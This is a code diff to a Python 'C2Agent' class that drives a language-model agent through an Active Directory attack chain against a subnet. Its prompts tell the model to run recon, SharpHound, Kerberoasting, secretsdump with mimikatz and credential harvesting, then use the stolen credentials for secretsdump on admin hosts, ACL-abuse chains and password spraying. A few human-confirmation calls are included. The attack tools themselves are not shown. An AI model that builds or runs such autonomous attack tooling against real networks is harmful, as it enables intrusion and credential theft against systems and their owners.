@@ -769,27 +769,52 @@ class C2Agent:
             return "continue"
         return "end"
 
-    def run(self, subnet: str, session_id: str = "c2-session") -> str:
+    def _invoke(self, message: str, session_id: str) -> str:
         config = {"configurable": {"thread_id": session_id}}
-        prompt = (
-            f"Begin the full attack chain against subnet: {subnet}\n"
-            "Follow all phases in order. Report your findings at each step."
-        )
-        print(f"\n[C2 Agent] Starting attack chain against {subnet}\n{'='*60}")
-
         final = self.app.invoke(
-            {
-                "messages": [HumanMessage(content=prompt)],
-                "user_id":  session_id,
-                "memories": "",
-            },
+            {"messages": [HumanMessage(content=message)], "user_id": session_id, "memories": ""},
             config=config,
         )
+        return final["messages"][-1].content
 
-        report = final["messages"][-1].content
+    def run(self, subnet: str, session_id: str = "c2-session") -> str:
+        print(f"\n[C2 Agent] Starting attack chain against {subnet}\n{'='*60}")
 
-        # ── Persist key findings back to Mem0 ─────────────────────────────────
-        self.memory_store.add(prompt,  user_id=session_id)
-        self.memory_store.add(report,  user_id=session_id)
+        # ── Phase 1-3: discovery, enumeration, credential harvesting ──────────
+        enum_prompt = (
+            f"Begin phases 1 through 3 against subnet: {subnet}\n"
+            "Execute IN ORDER:\n"
+            "1. c2_list_agents\n"
+            "2. c2_run_recon\n"
+            "3. c2_run_sharphound\n"
+            "4. c2_analyze_sharphound\n"
+            "5. c2_generate_map\n"
+            "6. c2_run_kerberoast\n"
+            "7. c2_run_secretsdump (if mimikatz.exe available)\n"
+            "8. c2_get_credentials\n"
+            "After step 8, stop and summarise ALL findings: credentials harvested, "
+            "local admin relationships, and ACL attack paths."
+        )
+        report = self._invoke(enum_prompt, session_id)
+        self.memory_store.add(report, user_id=session_id)
 
-        return report
+        print(f"\n{'='*60}")
+        print("[C2 Agent] Enumeration complete. Starting execution phase...\n")
+
+        # ── Phase 4: credential-driven attack execution ───────────────────────
+        exec_prompt = (
+            "Now execute Phase 4 using the credentials and attack paths you just found.\n\n"
+            "For EVERY local admin relationship where you have plaintext credentials:\n"
+            "  1. Call c2_ask_human to confirm\n"
+            "  2. c2_authenticate to verify access\n"
+            "  3. c2_run_secretsdump on that machine\n\n"
+            "For EVERY ACL attack path where you have credentials for the starting principal:\n"
+            "  1. Call c2_ask_human before EACH step\n"
+            "  2. Execute each c2_aclabuse step in the chain\n\n"
+            "If no matches: run c2_spray against each discovered host.\n"
+            "Finish with c2_generate_map."
+        )
+        exec_report = self._invoke(exec_prompt, session_id)
+        self.memory_store.add(exec_report, user_id=session_id)
+
+        return exec_report
